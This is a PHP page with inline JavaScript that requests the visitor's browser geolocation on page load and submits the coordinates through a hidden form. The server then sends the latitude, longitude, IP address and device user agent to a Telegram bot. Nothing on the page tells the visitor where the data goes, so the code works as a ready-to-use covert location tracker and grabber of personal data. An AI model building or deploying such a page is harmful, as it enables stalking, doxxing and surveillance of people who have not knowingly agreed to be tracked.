<?php

if (isset($_POST['latitude']) && isset($_POST['longitude'])) {
    // Retrieve the latitude and longitude from the POST parameters
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    // Retrieve the user's IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Retrieve information about the user's device
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Send the location data to a Telegram bot
    $bot_token = 'token';
    $chat_id = 'id';

    $message = "Latitude: $latitude\nLongitude: $longitude\nIP Address: $ip\nDevice Information: $user_agent";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
} else {
    // Show the HTML form to allow the user to share their location
    echo '<form method="POST" id="location-form">
          <input type="hidden" name="latitude" id="latitude">
          <input type="hidden" name="longitude" id="longitude">
          </form>';
}

?>

<script>
// Use the HTML5 Geolocation API to get the user's current location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

// Display the latitude and longitude in the form and submit the form
function showPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;

    document.getElementById("latitude").value = latitude;
    document.getElementById("longitude").value = longitude;
    document.getElementById("location-form").submit();
}

// Call getLocation() on page load to trigger the Geolocation permission prompt automatically
window.addEventListener("load", getLocation);

</script>
